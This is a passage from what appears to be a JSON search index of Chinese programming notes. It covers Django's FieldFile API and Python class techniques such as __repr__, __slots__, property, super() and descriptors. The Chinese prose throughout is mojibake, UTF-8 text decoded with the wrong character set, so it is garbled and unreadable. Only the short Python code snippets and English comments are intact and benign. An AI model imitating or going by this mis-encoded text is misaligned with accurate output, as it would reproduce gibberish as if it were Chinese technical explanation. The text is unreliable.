ç›¸åŒï¼Œä½†æœ‰ä¸€ä¸ªå…³é”®çš„åŒºåˆ«ã€‚ è¯¥ç±»æ‰€å°è£…çš„å¯¹è±¡ä¸ä¸€å®šæ˜¯ Python å†…ç½®æ–‡ä»¶å¯¹è±¡çš„å°è£… ç›¸åï¼Œ å®ƒæ˜¯ Storage.open() æ–¹æ³•ç»“æœçš„å°è£…ï¼Œè¯¥æ–¹æ³•å¯èƒ½æ˜¯ File å¯¹è±¡ï¼Œä¹Ÿå¯èƒ½æ˜¯è‡ªå®šä¹‰å­˜å‚¨å¯¹ File API çš„å®ç°ã€‚ é™¤äº†ä» File ç»§æ‰¿çš„ APIï¼Œå¦‚ read() å’Œ write() ä¹‹å¤–ï¼ŒFieldFile è¿˜åŒ…æ‹¬ä¸€äº›å¯ä»¥ç”¨æ¥ä¸åº•å±‚æ–‡ä»¶äº¤äº’çš„æ–¹æ³•ï¼š è­¦å‘Š è¯¥ç±»çš„ä¸¤ä¸ªæ–¹æ³• save() å’Œ delete()ï¼Œé»˜è®¤ä¸ºå°†ä¸ç›¸å…³ FieldFile çš„æ¨¡å‹å¯¹è±¡ä¿å­˜åœ¨æ•°æ®åº“ä¸­ã€‚ FieldFile.name æ–‡ä»¶åï¼ŒåŒ…æ‹¬ä»å…³è”çš„ Storage çš„æ ¹éƒ¨å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ FileFieldã€‚ FieldFile.path ä¸€ä¸ªåªè¯»å±æ€§ï¼Œé€šè¿‡è°ƒç”¨åº•å±‚çš„ path() æ–¹æ³•ï¼Œè®¿é—®æ–‡ä»¶çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ã€‚ FieldFile.size åº•å±‚ Storage.size() æ–¹æ³•çš„ç»“æœã€‚ FieldFile.url ä¸€ä¸ªåªè¯»å±æ€§ï¼Œé€šè¿‡è°ƒç”¨åº•å±‚ Storage ç±»çš„ Storage() æ–¹æ³•æ¥è®¿é—®æ–‡ä»¶çš„ç›¸å¯¹ URLã€‚ FieldFile.open(mode='rb') ä»¥æŒ‡å®šçš„ mode æ‰“å¼€æˆ–é‡æ–°æ‰“å¼€ä¸è¯¥å®ä¾‹ç›¸å…³çš„æ–‡ä»¶ã€‚ä¸æ ‡å‡†çš„ Python open() æ–¹æ³•ä¸åŒï¼Œå®ƒä¸è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ å› ä¸ºåœ¨è®¿é—®åº•å±‚æ–‡ä»¶æ—¶ï¼Œåº•å±‚æ–‡ä»¶æ˜¯éšå¼æ‰“å¼€çš„ï¼Œæ‰€ä»¥é™¤äº†é‡ç½®åº•å±‚æ–‡ä»¶çš„æŒ‡é’ˆæˆ–æ”¹å˜ mode ä¹‹å¤–ï¼Œå¯èƒ½æ²¡æœ‰å¿…è¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚ FieldFile.close() ç±»ä¼¼äºæ ‡å‡†çš„ Python file.close() æ–¹æ³•ï¼Œå…³é—­ä¸è¯¥å®ä¾‹ç›¸å…³çš„æ–‡ä»¶ã€‚ FieldFile.save(name, content, save=True) è¿™ä¸ªæ–¹æ³•æ¥æ”¶ä¸€ä¸ªæ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†å®ƒä»¬ä¼ é€’ç»™å­—æ®µçš„å­˜å‚¨ç±»ï¼Œç„¶åå°†å­˜å‚¨çš„æ–‡ä»¶ä¸æ¨¡å‹å­—æ®µå…³è”ã€‚ å¦‚æœä½ æƒ³æ‰‹åŠ¨å°†æ–‡ä»¶æ•°æ®ä¸æ¨¡å‹ä¸Šçš„ FileField å®ä¾‹å…³è”èµ·æ¥ï¼Œé‚£ä¹ˆ save() æ–¹æ³•ç”¨æ¥æŒä¹…åŒ–è¯¥æ–‡ä»¶æ•°æ®ã€‚ å–ä¸¤ä¸ªå¿…è¦çš„å‚æ•°ã€‚name æ˜¯æ–‡ä»¶çš„åç§°ï¼Œcontent æ˜¯åŒ…å«æ–‡ä»¶å†…å®¹çš„å¯¹è±¡ã€‚ å¯é€‰çš„ save å‚æ•°æ§åˆ¶åœ¨ä¸è¯¥å­—æ®µç›¸å…³è”çš„æ–‡ä»¶è¢«æ›´æ”¹åæ˜¯å¦ä¿å­˜æ¨¡å‹å®ä¾‹ã€‚é»˜è®¤ä¸º Trueã€‚ æ³¨è§£ content å‚æ•°åº”è¯¥æ˜¯ django.core.files.File çš„å®ä¾‹ï¼Œè€Œä¸æ˜¯ Python å†…ç½®çš„æ–‡ä»¶å¯¹è±¡ã€‚ ä½ å¯ä»¥ä»ç°æœ‰çš„ Python æ–‡ä»¶å¯¹è±¡æ„é€ ä¸€ä¸ª Fileï¼Œåƒè¿™æ ·: from django.core.files import File Open an existing file using Python's built-in open() f = open('/path/to/hello.world') myfile = File(f) æˆ–è€…ä½ å¯ä»¥ä» Python å­—ç¬¦ä¸²ä¸­æ„å»ºä¸€ä¸ªåƒè¿™æ ·çš„å­—ç¬¦ä¸²: from django.core.files.base import ContentFile myfile = ContentFile(\"hello world\") æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ ç®¡ç†æ–‡ä»¶ã€‚ FieldFile.delete(save=True) åˆ é™¤ä¸æ­¤å®ä¾‹ç›¸å…³çš„æ–‡ä»¶ï¼Œå¹¶æ¸…é™¤å­—æ®µçš„æ‰€æœ‰å±æ€§ã€‚ æ³¨æ„ï¼šå¦‚æœåœ¨è°ƒç”¨ delete() æ—¶ï¼Œæ–‡ä»¶æ°å¥½è¢«æ‰“å¼€ï¼Œæœ¬æ–¹æ³•å°†å…³é—­è¯¥æ–‡ä»¶ã€‚ å¯é€‰çš„ save å‚æ•°æ§åˆ¶åœ¨åˆ é™¤ä¸è¯¥å­—æ®µç›¸å…³çš„æ–‡ä»¶åæ˜¯å¦ä¿å­˜æ¨¡å‹å®ä¾‹ã€‚é»˜è®¤å€¼ä¸º Trueã€‚ æ³¨è§£ å½“ä¸€ä¸ªæ¨¡å‹è¢«åˆ é™¤æ—¶ï¼Œç›¸å…³æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ã€‚ å¦‚æœä½ éœ€è¦æ¸…ç†é—ç•™æ–‡ä»¶ï¼Œä½ éœ€è¦è‡ªå·±å¤„ç†ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨è‡ªå®šä¹‰ç®¡ç†å‘½ä»¤ï¼Œå¯ä»¥æ‰‹åŠ¨è¿è¡Œæˆ–é€šè¿‡ä¾‹å¦‚ cron å®šæœŸè¿è¡Œï¼‰ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Fieldfile.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Fieldfile.html"},{"title":"ç±»ä¸å¯¹è±¡","text":"ä¸»è¦å…³æ³¨ç‚¹çš„æ˜¯å’Œç±»å®šä¹‰æœ‰å…³çš„å¸¸è§ç¼–ç¨‹æ¨¡å‹ã€‚åŒ…æ‹¬è®©å¯¹è±¡æ”¯æŒå¸¸è§çš„ Python ç‰¹æ€§ã€ç‰¹æ®Šæ–¹æ³•çš„ä½¿ç”¨ã€ç±»å°è£…æŠ€æœ¯ã€ç»§æ‰¿ã€å†…å­˜ç®¡ç†ä»¥åŠæœ‰ç”¨çš„è®¾è®¡æ¨¡å¼ã€‚ æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²æ˜¾ç¤º æƒ³æ”¹å˜å¯¹è±¡å®ä¾‹çš„æ‰“å°æˆ–æ˜¾ç¤ºè¾“å‡ºï¼Œè®©å®ƒä»¬æ›´å…·å¯è¯»æ€§ é‡æ–°å®šä¹‰å®ƒçš„ __str__() å’Œ __repr__() æ–¹æ³•. repr__() æ–¹æ³•è¿”å›ä¸€ä¸ªå®ä¾‹çš„ä»£ç è¡¨ç¤ºå½¢å¼ï¼Œé€šå¸¸ç”¨æ¥é‡æ–°æ„é€ è¿™ä¸ªå®ä¾‹ã€‚ å†…ç½®çš„ repr() å‡½æ•°è¿”å›è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œè·Ÿæˆ‘ä»¬ä½¿ç”¨äº¤äº’å¼è§£é‡Šå™¨æ˜¾ç¤ºçš„å€¼æ˜¯ä¸€æ ·çš„ã€‚ __str__() æ–¹æ³•å°†å®ä¾‹è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½¿ç”¨ str() æˆ– print() å‡½æ•°ä¼šè¾“å‡ºè¿™ä¸ªå­— ç¬¦ä¸²: class Pair: def __init__(self, x, y): self.x = x self.y = y def __repr__(self): return 'Pair({0.x!r}, {0.y!r})'.format(self) def __str__(self): return '({0.x!s}, {0.y!s})'.format(self) ä½¿ç”¨: >>> p = Pair(3, 4) >>> p Pair(3, 4) # __repr__() output >>> print(p) (3, 4) # __str__() output >>> ç‰¹åˆ«æ¥è®²ï¼Œ!r æ ¼å¼åŒ–ä»£ç æŒ‡æ˜è¾“å‡ºä½¿ç”¨ __repr__() æ¥ä»£æ›¿é»˜è®¤çš„ __str__(): >>> p = Pair(3, 4) >>> print('p is {0!r}'.format(p)) p is Pair(3, 4) >>> print('p is {0}'.format(p)) p is (3, 4) >>> è‡ªå®šä¹‰ __repr__() å’Œ __str__() é€šå¸¸æ˜¯å¾ˆå¥½çš„ä¹ æƒ¯ï¼Œå› ä¸ºå®ƒèƒ½ç®€åŒ–è°ƒè¯•å’Œå®ä¾‹ è¾“å‡ºã€‚ä¾‹å¦‚ï¼Œå¦‚æœä»…ä»…åªæ˜¯æ‰“å°è¾“å‡ºæˆ–æ—¥å¿—è¾“å‡ºæŸä¸ªå®ä¾‹ï¼Œé‚£ä¹ˆç¨‹åºå‘˜ä¼šçœ‹åˆ°å®ä¾‹æ›´åŠ  è¯¦ç»†ä¸æœ‰ç”¨çš„ä¿¡æ¯ã€‚ __repr__() ç”Ÿæˆçš„æ–‡æœ¬å­—ç¬¦ä¸²æ ‡å‡†åšæ³•æ˜¯éœ€è¦è®© eval(repr(x)) == x ä¸ºçœŸã€‚å¦‚ æœå®åœ¨ä¸èƒ½è¿™æ ·å­åšï¼Œåº”è¯¥åˆ›å»ºä¸€ä¸ªæœ‰ç”¨çš„æ–‡æœ¬è¡¨ç¤ºï¼Œå¹¶ä½¿ç”¨ < å’Œ > æ‹¬èµ·æ¥ã€‚æ¯”å¦‚: >>> f = open('file.dat') >>> f <_io.TextIOWrapper name='file.dat' mode='r' encoding='UTF-8'> >>> å¦‚æœ __str__() æ²¡æœ‰è¢«å®šä¹‰ï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨ __repr__() æ¥ä»£æ›¿è¾“å‡ºã€‚ ä¸Šé¢çš„ format() æ–¹æ³•çš„ä½¿ç”¨çœ‹ä¸Šå»å¾ˆæœ‰è¶£ï¼Œæ ¼å¼åŒ–ä»£ç  {0.x} å¯¹åº”çš„æ˜¯ç¬¬ 1 ä¸ª å‚æ•°çš„ x å±æ€§ã€‚å› æ­¤ï¼Œåœ¨ä¸‹é¢çš„å‡½æ•°ä¸­ï¼Œ0 å®é™…ä¸ŠæŒ‡çš„å°±æ˜¯ self æœ¬èº«: def __repr__(self): return 'Pair({0.x!r}, {0.y!r})'.format(self) ä¹Ÿå¯ä»¥ä½¿ç”¨ % æ“ä½œç¬¦: 'Pair(%r, %r)' % (self.x, self.y) è‡ªå®šä¹‰å­—ç¬¦ä¸²çš„æ ¼å¼åŒ– é€šè¿‡ format() å‡½æ•°å’Œå­—ç¬¦ä¸²æ–¹æ³•ä½¿å¾—ä¸€ä¸ªå¯¹è±¡èƒ½æ”¯æŒè‡ªå®šä¹‰çš„æ ¼å¼åŒ– éœ€è¦åœ¨ç±»ä¸Šé¢å®šä¹‰ __format__() æ–¹æ³• __format__() æ–¹æ³•ç»™ Python çš„å­—ç¬¦ä¸²æ ¼å¼åŒ–åŠŸèƒ½æä¾›äº†ä¸€ä¸ªé’©å­ã€‚è¿™é‡Œéœ€è¦ç€ é‡å¼ºè°ƒçš„æ˜¯æ ¼å¼åŒ–ä»£ç çš„è§£æå·¥ä½œå®Œå…¨ç”±ç±»è‡ªå·±å†³å®šã€‚å› æ­¤ï¼Œæ ¼å¼åŒ–ä»£ç å¯ä»¥æ˜¯ä»»ä½• å€¼ è®©å¯¹è±¡æ”¯æŒä¸Šä¸‹æ–‡ç®¡ç†åè®® æƒ³è®©ä½ çš„å¯¹è±¡æ”¯æŒä¸Šä¸‹æ–‡ç®¡ç†åè®® (with è¯­å¥) withè¯­å¥éƒ¨åˆ†è¯´æ˜å¯è§: /docs/åç«¯/python/å†…ç½®å‡½æ•°/with éœ€è¦å®ç° __enter__() å’Œ __exit__() æ–¹æ³• ç¼–å†™ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„ä¸»è¦åŸç†æ˜¯ä½ çš„ä»£ç ä¼šæ”¾åˆ° with è¯­å¥å—ä¸­æ‰§è¡Œã€‚å½“å‡ºç° with è¯­å¥çš„æ—¶å€™ï¼Œå¯¹è±¡çš„ __enter__() æ–¹æ³•è¢«è§¦å‘ï¼Œå®ƒè¿”å›çš„å€¼ (å¦‚æœæœ‰çš„è¯) ä¼šè¢«èµ‹å€¼ç»™ as å£°æ˜çš„å˜é‡ã€‚ç„¶åï¼Œwith è¯­å¥å—é‡Œé¢çš„ä»£ç å¼€å§‹æ‰§è¡Œã€‚æœ€åï¼Œ__exit__() æ–¹æ³•è¢«è§¦ å‘è¿›è¡Œæ¸…ç†å·¥ä½œã€‚ ä¸ç®¡ with ä»£ç å—ä¸­å‘ç”Ÿä»€ä¹ˆï¼Œä¸Šé¢çš„æ§åˆ¶æµéƒ½ä¼šæ‰§è¡Œå®Œï¼Œå°±ç®—ä»£ç å—ä¸­å‘ç”Ÿäº†å¼‚ å¸¸ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚äº‹å®ä¸Šï¼Œ__exit__() æ–¹æ³•çš„ç¬¬ä¸‰ä¸ªå‚æ•°åŒ…å«äº†å¼‚å¸¸ç±»å‹ã€å¼‚å¸¸å€¼å’Œè¿½ æº¯ä¿¡æ¯ (å¦‚æœæœ‰çš„è¯)ã€‚__exit__() æ–¹æ³•èƒ½è‡ªå·±å†³å®šæ€æ ·åˆ©ç”¨è¿™ä¸ªå¼‚å¸¸ä¿¡æ¯ï¼Œæˆ–è€…å¿½ç•¥ å®ƒå¹¶è¿”å›ä¸€ä¸ª None å€¼ã€‚å¦‚æœ __exit__() è¿”å› True ï¼Œé‚£ä¹ˆå¼‚å¸¸ä¼šè¢«æ¸…ç©ºï¼Œå°±å¥½åƒä»€ ä¹ˆéƒ½æ²¡å‘ç”Ÿä¸€æ ·ï¼Œwith è¯­å¥åé¢çš„ç¨‹åºç»§ç»­åœ¨æ­£å¸¸æ‰§è¡Œã€‚ åœ¨ contextmanager æ¨¡å—ä¸­æœ‰ä¸€ä¸ªæ ‡å‡†çš„ä¸Šä¸‹æ–‡ç®¡ç†æ–¹æ¡ˆæ¨¡æ¿, å¯å‚è€ƒ /docs/åç«¯/python/pythonæ ‡å‡†åº“/contextlib åˆ›å»ºå¤§é‡å¯¹è±¡æ—¶èŠ‚çœå†…å­˜æ–¹æ³• è¦åˆ›å»ºå¤§é‡ (å¯èƒ½ä¸Šç™¾ä¸‡) çš„å¯¹è±¡ï¼Œå¯¼è‡´å ç”¨å¾ˆå¤§çš„å†…å­˜ å¯¹äºä¸»è¦æ˜¯ç”¨æ¥å½“æˆç®€å•çš„æ•°æ®ç»“æ„çš„ç±»è€Œè¨€ï¼Œä½ å¯ä»¥é€šè¿‡ç»™ç±»æ·»åŠ  __slots__ å±æ€§æ¥æå¤§çš„å‡å°‘å®ä¾‹æ‰€å çš„å†…å­˜ã€‚æ¯”å¦‚: class Date: __slots__ = ['year', 'month', 'day'] def __init__(self, year, month, day): self.year = year self.month = month self.day = day å½“ä½ å®šä¹‰ __slots__ åï¼ŒPython å°±ä¼šä¸ºå®ä¾‹ä½¿ç”¨ä¸€ç§æ›´åŠ ç´§å‡‘çš„å†…éƒ¨è¡¨ç¤ºã€‚å® ä¾‹é€šè¿‡ä¸€ä¸ªå¾ˆå°çš„å›ºå®šå¤§å°çš„æ•°ç»„æ¥æ„å»ºï¼Œè€Œä¸æ˜¯ä¸ºæ¯ä¸ªå®ä¾‹å®šä¹‰ä¸€ä¸ªå­—å…¸ï¼Œè¿™è·Ÿå…ƒ ç»„æˆ–åˆ—è¡¨å¾ˆç±»ä¼¼ã€‚åœ¨ __slots__ ä¸­åˆ—å‡ºçš„å±æ€§ååœ¨å†…éƒ¨è¢«æ˜ å°„åˆ°è¿™ä¸ªæ•°ç»„çš„æŒ‡å®šå°æ ‡ ä¸Šã€‚ä½¿ç”¨ slots ä¸€ä¸ªä¸å¥½çš„åœ°æ–¹å°±æ˜¯æˆ‘ä»¬ä¸èƒ½å†ç»™å®ä¾‹æ·»åŠ æ–°çš„å±æ€§äº†ï¼Œåªèƒ½ä½¿ç”¨åœ¨ __slots__ ä¸­å®šä¹‰çš„é‚£äº›å±æ€§åã€‚ å…¶å®å°±æ˜¯, å†…éƒ¨å­—å…¸åªèƒ½æœ‰ __slots__ å®šä¹‰çš„å±æ€§ å°½ç®¡ slots çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„ç‰¹æ€§ï¼Œå¾ˆå¤šæ—¶å€™ä½ è¿˜æ˜¯å¾—å‡å°‘å¯¹å®ƒçš„ä½¿ç”¨å†²åŠ¨ã€‚ Python çš„å¾ˆå¤šç‰¹æ€§éƒ½ä¾èµ–äºæ™®é€šçš„åŸºäºå­—å…¸çš„å®ç°ã€‚å¦å¤–ï¼Œå®šä¹‰äº† slots åçš„ç±»ä¸å†æ”¯ æŒä¸€äº›æ™®é€šç±»ç‰¹æ€§äº†ï¼Œæ¯”å¦‚å¤šç»§æ‰¿ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½ åº”è¯¥åªåœ¨é‚£äº›ç»å¸¸è¢«ä½¿ç”¨åˆ°çš„ç”¨ ä½œæ•°æ®ç»“æ„çš„ç±»ä¸Šå®šä¹‰ slots (æ¯”å¦‚åœ¨ç¨‹åºä¸­éœ€è¦åˆ›å»ºæŸä¸ªç±»çš„å‡ ç™¾ä¸‡ä¸ªå®ä¾‹å¯¹è±¡)ã€‚ å…³äº __slots__ çš„ä¸€ä¸ªå¸¸è§è¯¯åŒºæ˜¯å®ƒå¯ä»¥ä½œä¸ºä¸€ä¸ªå°è£…å·¥å…·æ¥é˜²æ­¢ç”¨æˆ·ç»™å®ä¾‹å¢ åŠ æ–°çš„å±æ€§ã€‚å°½ç®¡ä½¿ç”¨ slots å¯ä»¥è¾¾åˆ°è¿™æ ·çš„ç›®çš„ï¼Œä½†æ˜¯è¿™ä¸ªå¹¶ä¸æ˜¯å®ƒçš„åˆè¡·ã€‚__slots__ æ›´å¤šçš„æ˜¯ç”¨æ¥ä½œä¸ºä¸€ä¸ªå†…å­˜ä¼˜åŒ–å·¥å…·ã€‚ åœ¨ç±»ä¸­å°è£…å±æ€§å å•ä¸‹åˆ’çº¿å‰ç¼€, ç±»ç§æœ‰å±æ€§(ç±»ä¼¼ java çš„ protect) åŒä¸‹åˆ’çº¿å‰ç¼€, åŸºç±»ç§æœ‰å±æ€§, é˜²æ­¢è¢«ç»§æ‰¿(ç±»ä¼¼ java çš„ privite) å•ä¸‹åˆ’çº¿åç¼€, é˜²æ­¢ä¸ä¿ç•™å…³é”®å­—å†²çª. æ³¨æ„, è¿™äº›ä»…æ˜¯ä¸€ç§ç¼–ç çº¦å®š. å°è£…ç±»çš„å®ä¾‹ä¸Šé¢çš„\"ç§æœ‰\"æ•°æ®ï¼Œä½†æ˜¯ Python è¯­è¨€å¹¶æ²¡æœ‰è®¿é—®æ§åˆ¶ã€‚ Python ç¨‹åºå‘˜ä¸å»ä¾èµ–è¯­è¨€ç‰¹æ€§å»å°è£…æ•°æ®ï¼Œè€Œæ˜¯é€šè¿‡éµå¾ªä¸€å®šçš„å±æ€§å’Œæ–¹æ³•å‘½ åè§„çº¦æ¥è¾¾åˆ°è¿™ä¸ªæ•ˆæœã€‚ç¬¬ä¸€ä¸ªçº¦å®šæ˜¯ä»»ä½•ä»¥å•ä¸‹åˆ’çº¿ _ å¼€å¤´çš„åå­—éƒ½åº”è¯¥æ˜¯å†…éƒ¨å® ç°ã€‚ åŒæ—¶è¿˜è¦æ³¨æ„åˆ°ï¼Œä½¿ç”¨ä¸‹åˆ’çº¿å¼€å¤´çš„çº¦å®šåŒæ ·é€‚ç”¨äºæ¨¡å—åå’Œæ¨¡ å—çº§åˆ«å‡½æ•°ã€‚ ä½¿ç”¨åŒä¸‹åˆ’çº¿å¼€å§‹ä¼šå¯¼è‡´è®¿é—®åç§°å˜æˆå…¶ä»–å½¢å¼, ä¸»è¦ç”¨äºé˜²æ­¢è¢«ç»§æ‰¿. æœ‰æ—¶å€™ä½ å®šä¹‰çš„ä¸€ä¸ªå˜é‡å’ŒæŸä¸ªä¿ç•™å…³é”®å­—å†²çªï¼Œè¿™æ—¶å€™å¯ ä»¥ä½¿ç”¨å•ä¸‹åˆ’çº¿ä½œä¸ºåç¼€. åˆ›å»ºå¯ç®¡ç†çš„å±æ€§ æƒ³ç»™æŸä¸ªå®ä¾‹ attribute å¢åŠ é™¤è®¿é—®ä¸ä¿®æ”¹ä¹‹å¤–çš„å…¶ä»–å¤„ç†é€»è¾‘ï¼Œæ¯”å¦‚ç±»å‹æ£€æŸ¥æˆ–åˆæ³•æ€§éªŒè¯ã€‚ ä½¿ç”¨ @property è£…é¥°å™¨. æ³¨æ„å¯¹åº”çš„æœ‰ @xxx.setter : èµ‹å€¼æ—¶è§¦å‘ @xxx.deleter : del xxx æ—¶è§¦å‘ è¿˜èƒ½åœ¨å·²å­˜åœ¨çš„ get å’Œ set æ–¹æ³•åŸºç¡€ä¸Šå®šä¹‰ propertyã€‚ä¾‹å¦‚: class Person: def __init__(self, first_name): self.set_first_name(first_name) # Getter function def get_first_name(self): return self._first_name # Setter function def set_first_name(self, value): if not isinstance(value, str): raise TypeError('Expected a string') self._first_name = value # Deleter function (optional) def del_first_name(self): raise AttributeError(\"Can't delete attribute\") # Make a property from existing get/set methods name = property(get_first_name, set_first_name, del_first_name) ä¸€ä¸ª property å±æ€§å…¶å®å°±æ˜¯ä¸€ç³»åˆ—ç›¸å…³ç»‘å®šæ–¹æ³•çš„é›†åˆã€‚å¦‚æœä½ å»æŸ¥çœ‹æ‹¥æœ‰ property çš„ç±»ï¼Œå°±ä¼šå‘ç° property æœ¬èº«çš„ fgetã€fset å’Œ fdel å±æ€§å°±æ˜¯ç±»é‡Œé¢çš„æ™®é€šæ–¹ æ³•ã€‚æ¯”å¦‚: >>> Person.first_name.fget <function Person.first_name at 0x1006a60e0> >>> Person.first_name.fset <function Person.first_name at 0x1006a6170> >>> Person.first_name.fdel <function Person.first_name at 0x1006a62e0> >>> é€šå¸¸æ¥è®²ï¼Œä½ ä¸ä¼šç›´æ¥å–è°ƒç”¨ fget æˆ–è€… fsetï¼Œå®ƒä»¬ä¼šåœ¨è®¿é—® property çš„æ—¶å€™è‡ªåŠ¨ è¢«è§¦å‘ã€‚ åªæœ‰å½“ä½ ç¡®å®éœ€è¦å¯¹ attribute æ‰§è¡Œå…¶ä»–é¢å¤–çš„æ“ä½œçš„æ—¶å€™æ‰åº”è¯¥ä½¿ç”¨åˆ° propertyã€‚ æœ‰æ—¶å€™ä¸€äº›ä»å…¶ä»–ç¼–ç¨‹è¯­è¨€ (æ¯”å¦‚ Java) è¿‡æ¥çš„ç¨‹åºå‘˜æ€»è®¤ä¸ºæ‰€æœ‰è®¿é—®éƒ½åº”è¯¥é€šè¿‡ getter å’Œ setterï¼Œæ‰€ä»¥ä»–ä»¬è®¤ä¸ºä»£ç åº”è¯¥åƒä¸‹é¢è¿™æ ·å†™(æ¯”å¦‚æˆ‘ä¹‹å‰å°±æ˜¯): class Person: def __init__(self, first_name): self.first_name = first_name @property def first_name(self): return self._first_name @first_name.setter def first_name(self, value): self._first_name = value ä¸è¦å†™è¿™ç§æ²¡æœ‰åšä»»ä½•å…¶ä»–é¢å¤–æ“ä½œçš„ propertyã€‚é¦–å…ˆï¼Œå®ƒä¼šè®©ä½ çš„ä»£ç å˜å¾—å¾ˆè‡ƒ è‚¿ï¼Œå¹¶ä¸”è¿˜ä¼šè¿·æƒ‘é˜…è¯»è€…ã€‚å…¶æ¬¡ï¼Œå®ƒè¿˜ä¼šè®©ä½ çš„ç¨‹åºè¿è¡Œèµ·æ¥å˜æ…¢å¾ˆå¤šã€‚æœ€åï¼Œè¿™æ ·çš„è®¾ è®¡å¹¶æ²¡æœ‰å¸¦æ¥ä»»ä½•çš„å¥½å¤„ã€‚ è°ƒç”¨çˆ¶ç±»æ–¹æ³• æƒ³åœ¨å­ç±»ä¸­è°ƒç”¨çˆ¶ç±»çš„æŸä¸ªå·²ç»è¢«è¦†ç›–çš„æ–¹æ³•ã€‚ ä½¿ç”¨ super() å‡½æ•°, å¯å‚è€ƒ: /docs/åç«¯/python/æ¦‚å¿µç›¸å…³/å¯¹superçš„ç†è§£ class A: def spam(self): print('A.spam') class B(A): def spam(self): print('B.spam') super().spam() # Call parent spam() super() å‡½æ•°çš„ä¸€ä¸ªå¸¸è§ç”¨æ³•æ˜¯åœ¨ __init__() æ–¹æ³•ä¸­ç¡®ä¿çˆ¶ç±»è¢«æ­£ç¡®çš„åˆå§‹åŒ–äº† å¯¹äºä½  å®šä¹‰çš„æ¯ä¸€ä¸ªç±»ï¼ŒPython ä¼šè®¡ç®—å‡ºä¸€ä¸ªæ‰€è°“çš„æ–¹æ³•è§£æé¡ºåº (MRO) åˆ—è¡¨ã€‚è¿™ä¸ª MRO åˆ—è¡¨å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ‰€æœ‰åŸºç±»çš„çº¿æ€§é¡ºåºè¡¨ã€‚ä¾‹å¦‚: >>> C.__mro__ (<class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>, <class '__main__.Base'>, <class 'object'>) >>> ä¸ºäº†å®ç°ç»§æ‰¿ï¼ŒPython ä¼šåœ¨ MRO åˆ—è¡¨ä¸Šä»å·¦åˆ°å³å¼€å§‹æŸ¥æ‰¾åŸºç±»ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬ä¸€ ä¸ªåŒ¹é…è¿™ä¸ªå±æ€§çš„ç±»ä¸ºæ­¢ã€‚ è€Œè¿™ä¸ª MRO åˆ—è¡¨çš„æ„é€ æ˜¯é€šè¿‡ä¸€ä¸ª C3 çº¿æ€§åŒ–ç®—æ³•æ¥å®ç°çš„ã€‚æˆ‘ä»¬ä¸å»æ·±ç©¶è¿™ä¸ª ç®—æ³•çš„æ•°å­¦åŸç†ï¼Œå®ƒå®é™…ä¸Šå°±æ˜¯åˆå¹¶æ‰€æœ‰çˆ¶ç±»çš„ MRO åˆ—è¡¨å¹¶éµå¾ªå¦‚ä¸‹ä¸‰æ¡å‡†åˆ™ï¼š å­ç±»ä¼šå…ˆäºçˆ¶ç±»è¢«æ£€æŸ¥ å¤šä¸ªçˆ¶ç±»ä¼šæ ¹æ®å®ƒä»¬åœ¨åˆ—è¡¨ä¸­çš„é¡ºåºè¢«æ£€æŸ¥ å¦‚æœå¯¹ä¸‹ä¸€ä¸ªç±»å­˜åœ¨ä¸¤ä¸ªåˆæ³•çš„é€‰æ‹©ï¼Œé€‰æ‹©ç¬¬ä¸€ä¸ªçˆ¶ç±» ç„¶è€Œï¼Œç”±äº super() å¯èƒ½ä¼šè°ƒç”¨ä¸æ˜¯ä½ æƒ³è¦çš„æ–¹æ³•ï¼Œä½ åº”è¯¥éµå¾ªä¸€äº›é€šç”¨åŸåˆ™ã€‚é¦– å…ˆï¼Œç¡®ä¿åœ¨ç»§æ‰¿ä½“ç³»ä¸­æ‰€æœ‰ç›¸åŒåå­—çš„æ–¹æ³•æ‹¥æœ‰å¯å…¼å®¹çš„å‚æ•°ç­¾å (æ¯”å¦‚ç›¸åŒçš„å‚æ•°ä¸ª æ•°å’Œå‚æ•°åç§°)ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿ super() è°ƒç”¨ä¸€ä¸ªéç›´æ¥çˆ¶ç±»æ–¹æ³•æ—¶ä¸ä¼šå‡ºé”™ã€‚å…¶æ¬¡ï¼Œ æœ€å¥½ç¡®ä¿æœ€é¡¶å±‚çš„ç±»æä¾›äº†è¿™ä¸ªæ–¹æ³•çš„å®ç°ï¼Œè¿™æ ·çš„è¯åœ¨ MRO ä¸Šé¢çš„æŸ¥æ‰¾é“¾è‚¯å®šå¯ ä»¥æ‰¾åˆ°æŸä¸ªç¡®å®šçš„æ–¹æ³• å­ç±»ä¸­æ‰©å±• property åˆ›å»ºæ–°çš„ç±»æˆ–å®ä¾‹å±æ€§ åˆ›å»ºä¸€ä¸ªæ–°çš„æ‹¥æœ‰ä¸€äº›é¢å¤–åŠŸèƒ½çš„å®ä¾‹å±æ€§ç±»å‹ï¼Œæ¯”å¦‚ç±»å‹æ£€æŸ¥ å¦‚æœä½ æƒ³åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„å®ä¾‹å±æ€§ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªæè¿°å™¨ç±»çš„å½¢å¼æ¥å®šä¹‰å®ƒçš„åŠŸ èƒ½ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­: # Descriptor attribute for an integer type-checked attribute class Integer: def __init__(self, name): self.name = name def __get__(self, instance, cls): if instance is None: return self 